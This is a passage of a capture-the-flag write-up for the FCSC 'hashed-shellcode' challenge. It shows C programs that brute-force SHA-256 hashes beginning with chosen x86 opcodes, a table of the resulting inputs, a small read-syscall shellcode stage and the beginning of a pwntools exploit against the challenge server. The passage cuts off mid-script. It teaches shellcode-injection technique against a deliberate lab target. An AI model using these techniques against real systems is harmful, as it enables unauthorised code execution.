+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(input, <span style="color:#e6db74">&#34;FCSC_&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>; i <span style="color:#f92672">&lt;</span> MAX_INPUT_LENGTH; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        input[i] <span style="color:#f92672">=</span> charset[<span style="color:#a6e22e">rand</span>() <span style="color:#f92672">%</span> charset_size];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    input[MAX_INPUT_LENGTH <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//srand(time(NULL));
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//srand(1234);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> input[MAX_INPUT_LENGTH];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> hash[SHA256_DIGEST_LENGTH];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> chk <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">generate_random_input</span>(input);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">calculate_sha256</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)input, <span style="color:#a6e22e">strlen</span>(input), hash);
+</span></span><span style="display:flex;"><span>        chk <span style="color:#f92672">=</span> <span style="color:#a6e22e">memcmp</span>(hash, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x4a\x27\xc3</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">4</span>); <span style="color:#75715e">// dec byte ptr [rdx+0x27] ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>chk) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Input: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, input);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Hash SHA256 : &#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SHA256_DIGEST_LENGTH; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%02x&#34;</span>, hash[i]);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//printf(&#34;ERROR\n&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We generate valid hashes which need to start by &ldquo;\xfe\x4a\x27\xc3&rdquo; opcodes, which are <code>dec byte ptr [rdx+0x27] ; ret</code> instruction.</p>
+<p>We find a valid input in about ~5 to 10 minutes. My Python scripts were based on the fact that the opcodes we search are going to be somewhere in the hash and instructions before do not impact them or crash. In this case we bruteforce directly the first bytes of the hash and it&rsquo;s in C, we have fewer chances to have good opcodes at the start but it&rsquo;s way faster, so it works better.</p>
+<blockquote>
+<p>4 hash start bytes could be brute force in few minutes, but more than 4 bytes could take much more time, that&rsquo;s why we used dec/inc instructions because in our case they take 3 bytes and 1 more with the ret instruction. I missed this fact, I should have did more test with C bruteforce at the start.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>reset_buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;FCSC_D8OHvw[`I`H1g4f?p@c1Hkj{;L&#34;</span>  <span style="color:#75715e"># dec byte ptr [rdx+0x27] ; ret</span>
+</span></span></code></pre></div><p>We have the input to loop. Now, like we did before, but with rdx, we are going to search for hash to <code>inc byte [rdx + 0xXX]</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">srand</span>(<span style="color:#a6e22e">time</span>(NULL));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> input[MAX_INPUT_LENGTH];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> hash[SHA256_DIGEST_LENGTH];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> desired_sequences[][<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x50\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x51\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x52\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x53\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x54\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x55\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x56\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x57\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x58\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x59\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x5a\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x5b\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x5c\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x5d\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x5e\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x42\x5f\xc3</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> num_sequences <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(desired_sequences) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(desired_sequences[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> chk <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">generate_random_input</span>(input);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">calculate_sha256</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)input, <span style="color:#a6e22e">strlen</span>(input), hash);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> num_sequences; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            chk <span style="color:#f92672">=</span> <span style="color:#a6e22e">memcmp</span>(hash, desired_sequences[i], <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (chk <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Input:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> MAX_INPUT_LENGTH; j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x%02x&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>)input[j]);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Hash SHA256 : &#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> SHA256_DIGEST_LENGTH; j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%02x&#34;</span>, hash[j]);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34; matched desired sequence %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i);
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">//break; 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We have the opcodes we searched for, and after a few minutes, we could forge our Python dictionary and craft the exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>dic <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x50</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xc7\xe7\x66\x87\xbf\x44\xd1\xa5\xb0\xfb\x6d\x03\x05\x72\x37\xa6\x99\xf2\x73\x50\xda\xe5\xde\x18\xf6\x1e\xa5\x15\xa1</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x51</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xf7\x3c\x5a\x08\xf2\x68\x0f\x99\x2f\xcb\xbd\xb9\x43\x5f\x73\x4e\x2e\x2f\xfb\x5e\x4c\x89\x89\x39\xcf\x63\xc8\xd1\x84</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x52</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x10\xb4\x2c\xdb\xcd\x98\xa1\x7e\x2c\x1e\x0e\xf3\xd5\x1b\x31\x6d\x3c\xcb\x58\xfc\xcf\x68\xdc\x8c\xb6\xed\x12\xc1\x4d</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x53</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x73\xfc\x95\xb3\xa9\xef\x65\xa3\x45\x78\x71\xcc\xb3\x30\x7f\x67\xc1\x53\x88\x2d\x67\x9b\x04\xfc\x6b\x1e\x62\xab\x04</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x54</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x4a\x3d\x4d\x43\xd6\x0e\xbe\xbc\xa7\x97\xd3\xd0\x22\x33\x43\xf9\x11\x10\x3a\xfb\x57\x84\x80\x90\x17\xfb\xed\xb7\x53</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x55</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xd0\x7d\xfc\x44\x05\x74\x56\x27\x91\x98\x8c\xf8\x90\xe4\x12\x63\x71\x90\xf4\xf3\x05\xd6\xed\xc5\x3f\x2a\x53\x6e\x16</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x56</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x5f\xd4\x26\xb8\x44\xcf\x1b\x04\x94\xfe\xd9\x78\x3c\x5d\xe4\xa7\x4c\xc6\x06\xde\xa7\xf4\x13\x8c\x68\xed\x87\x7d\x7f</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x57</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xe2\x55\xdf\xde\xd7\x66\x91\x06\x73\x79\x03\x89\xb5\x4d\x25\x3b\xb2\xee\xe0\x3b\x64\x8e\x6d\x06\xb4\xed\x1c\xca\x48</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x58</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xe2\x55\x53\xe2\x7b\x47\x5d\x5c\x40\xb2\x79\x71\xb3\xd9\x63\x74\x44\xe7\x1b\xc5\xa9\x35\x40\xbf\x1a\xc8\x48\x61\x79</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x59</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x86\xfd\x8e\x28\x21\x7c\xa1\x9a\xe5\x2b\xfb\x8f\x84\x6c\x6b\x56\x16\x60\x49\xcb\xf5\x1f\x75\xb5\x2d\x04\xa8\xa6\x48</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x5b</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xf8\x93\x61\x26\xa2\x09\xf6\x64\xeb\xe0\xb0\x88\xb5\xad\xb0\xb3\x41\x11\xb6\x96\x0f\x19\xfb\x48\xd6\x55\xca\x7e\xc9</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x5c</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xea\x66\x77\xf1\x87\x44\x6c\x30\x06\x6c\x45\xf7\x1a\x93\x14\xd4\xae\x17\x18\xcf\x97\x81\x6b\x77\x93\x8b\x2d\x8d\x62</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x5d</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x89\x0f\x87\x2e\xaf\x3f\xbf\x8d\xdc\x94\x55\xbb\xf0\xa4\xdc\x39\x7b\x10\x44\x14\x2a\xad\xcc\x7b\x87\x51\x44\xa5\x3d</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x5e</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x8c\x44\xbf\x03\x72\x3d\xe0\x5f\xfe\x3e\xa5\x9c\x4e\x79\x17\x50\xdc\xa2\x86\x7a\xf0\x22\xb5\xa8\x9d\x89\x7b\x29\x19</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x5f</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x8d\x7e\xc4\x46\x79\x58\x86\x9c\x32\x08\x4a\xf3\x76\x8c\xa5\x63\xde\xc3\x52\xd8\x5d\x42\x8c\x4a\x83\x67\x9f\xdc\x18</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The shellcode change a little bit :</p>
+<pre tabindex="0"><code>mov rsi, rdx
+mov edx, 0x500
+syscall
+</code></pre><p>RSI was at 0 so we set it to rdx, and call read. We overwrite the memory section with the shellcode input and the return of the read call is on our shellcode (nop instructions).</p>
+<p>Here is the final exploit :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>, <span style="color:#e6db74">&#34;new-window&#34;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level = &#39;info&#39;</span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./hashed-shellcode&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#rop = ROP([bin,libc])</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sla</span>(delim,line): <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>sendlineafter(delim,line)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sl</span>(line): <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>sendline(line)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rcu</span>(delim): <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>recvuntil(delim)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rcv</span>(number): <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>recv(number)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rcvl</span>(): <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> io
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>        io <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path], gdbscript<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        #decompiler connect ida --host 127.0.0.1 --port 3662
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        #si
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        #b*0x00005555555551e9
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b*0x5555555554dd
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#39;&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>        io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;challenges.france-cybersecurity-challenge.fr&#34;</span>, <span style="color:#ae81ff">2107</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        io <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> io
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dic <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x50</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xc7\xe7\x66\x87\xbf\x44\xd1\xa5\xb0\xfb\x6d\x03\x05\x72\x37\xa6\x99\xf2\x73\x50\xda\xe5\xde\x18\xf6\x1e\xa5\x15\xa1</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x51</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xf7\x3c\x5a\x08\xf2\x68\x0f\x99\x2f\xcb\xbd\xb9\x43\x5f\x73\x4e\x2e\x2f\xfb\x5e\x4c\x89\x89\x39\xcf\x63\xc8\xd1\x84</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x52</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x10\xb4\x2c\xdb\xcd\x98\xa1\x7e\x2c\x1e\x0e\xf3\xd5\x1b\x31\x6d\x3c\xcb\x58\xfc\xcf\x68\xdc\x8c\xb6\xed\x12\xc1\x4d</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x53</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x73\xfc\x95\xb3\xa9\xef\x65\xa3\x45\x78\x71\xcc\xb3\x30\x7f\x67\xc1\x53\x88\x2d\x67\x9b\x04\xfc\x6b\x1e\x62\xab\x04</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x54</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x4a\x3d\x4d\x43\xd6\x0e\xbe\xbc\xa7\x97\xd3\xd0\x22\x33\x43\xf9\x11\x10\x3a\xfb\x57\x84\x80\x90\x17\xfb\xed\xb7\x53</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x55</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xd0\x7d\xfc\x44\x05\x74\x56\x27\x91\x98\x8c\xf8\x90\xe4\x12\x63\x71\x90\xf4\xf3\x05\xd6\xed\xc5\x3f\x2a\x53\x6e\x16</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x56</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x5f\xd4\x26\xb8\x44\xcf\x1b\x04\x94\xfe\xd9\x78\x3c\x5d\xe4\xa7\x4c\xc6\x06\xde\xa7\xf4\x13\x8c\x68\xed\x87\x7d\x7f</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x57</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xe2\x55\xdf\xde\xd7\x66\x91\x06\x73\x79\x03\x89\xb5\x4d\x25\x3b\xb2\xee\xe0\x3b\x64\x8e\x6d\x06\xb4\xed\x1c\xca\x48</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x58</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xe2\x55\x53\xe2\x7b\x47\x5d\x5c\x40\xb2\x79\x71\xb3\xd9\x63\x74\x44\xe7\x1b\xc5\xa9\x35\x40\xbf\x1a\xc8\x48\x61\x79</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x59</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x86\xfd\x8e\x28\x21\x7c\xa1\x9a\xe5\x2b\xfb\x8f\x84\x6c\x6b\x56\x16\x60\x49\xcb\xf5\x1f\x75\xb5\x2d\x04\xa8\xa6\x48</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x5b</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xf8\x93\x61\x26\xa2\x09\xf6\x64\xeb\xe0\xb0\x88\xb5\xad\xb0\xb3\x41\x11\xb6\x96\x0f\x19\xfb\x48\xd6\x55\xca\x7e\xc9</span><span style="color:#e6db74">&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x5c</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xea\x66\x77\xf1\x87\x44\x6c\x30\x06\x6c\x45\xf7\x1a\x93\x14\xd4\xae\x17\x18\xcf\x97\x81\x6b\x77\x93\x8b\x2d\x8d\x62</span><span style="color:#e6db74">&#39;</span>,
